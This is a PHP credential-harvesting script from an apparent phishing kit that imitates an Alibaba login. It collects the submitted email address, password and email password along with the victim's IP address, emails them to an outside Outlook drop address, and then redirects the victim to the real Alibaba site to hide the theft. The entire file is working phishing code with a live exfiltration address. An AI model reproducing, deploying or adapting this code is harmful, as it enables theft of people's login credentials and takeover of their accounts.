<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Spam ReSulT--------------------\n";
$message .= "Email Add  : ".$_POST['login']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "Emailpwd : ".$_POST['pwd']."\n";
$message .= "----------------created by Last Kvng-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------Spam ReSulT--------------------\n";
$send = "freezulze@outlook.com";
$subject = "alibaba results";
$headers = "From: ReZult<outdoor.shantalyu66@outlook.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://www.alibaba.com/";

</script>